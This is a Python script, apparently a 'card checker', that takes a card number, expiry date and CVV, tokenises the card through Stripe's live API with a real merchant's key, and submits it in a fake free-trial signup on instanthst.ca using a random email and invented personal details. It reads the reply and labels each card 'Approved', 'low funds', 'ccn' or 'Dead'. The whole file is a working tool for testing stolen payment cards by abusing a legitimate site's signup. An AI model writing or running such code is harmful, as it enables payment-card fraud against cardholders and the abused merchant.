import asyncio
from utilsdf.functions import  capture, random_email
from httpx import AsyncClient


async def lynx(cc, month, year, cvv):
    async with AsyncClient(
        follow_redirects=True, verify=False, 
    ) as session:
        mail = random_email()

        r = await session.get(
            "https://instanthst.ca/accounts/signup/",
        )
        t = r.text
        csrf = capture(t, '"csrfmiddlewaretoken" value="', '"')

        h2 = {
            "Host": "api.stripe.com",
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
        }

        p2 = f"card[number]={cc}&card[cvc]={cvv}&card[exp_month]={month}&card[exp_year]={year}&guid=N/A&muid=N/A&sid=N/A&payment_user_agent=stripe.js%2Fb06866a7a1%3B+stripe-js-v3%2Fb06866a7a1%3B+card-element&referrer=https%3A%2F%2Finstanthst.ca&time_on_page=18310&key=pk_live_gdp3iP8JW1FOupxGzzyf5Acs"

        r2 = await session.post(
            "https://api.stripe.com/v1/tokens",
            headers=h2,
            data=p2,
        )
        t2 = r2.text
        tok = capture(t2, '"id": "', '"')

        h3 = {
            "Host": "instanthst.ca",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
            "Origin": "https://instanthst.ca",
            "Referer": "https://instanthst.ca/accounts/signup/",
        }

        p3 = f"csrfmiddlewaretoken={csrf}&email={mail}&fname=SHsjjss&lname=Sachio&phone=19059495353&industry=&employees=&address=3168+Hurontario&address1=3168+Hurontario&city=Mississauga&state=1&postalcode=L5B+1N9&country=1&token={tok}&plan=1&interval=month"

        r3 = await session.post(
            "https://instanthst.ca/license/free-trial/",
            headers=h3,
            data=p3,
        )
        t3 = r3.text
        msg2 = capture(t3, '{"', '"')
        msg = capture(t3, f'"{msg2}": "', '"')

        if (
            msg
            == "Registration was successful. Confirmation email with your password has been sent to your email."
        ):
            status = "Approved! ✅"
            msg = "Success -» $0.00"
        elif msg == "Your card has insufficient funds.":
            status = "Approved! ✅ -» low funds"
        elif msg == "Your card's security code is incorrect.":
            status = "Approved! ✅ -» ccn"
        else:
            status = "Dead! ❌"

        return status, msg
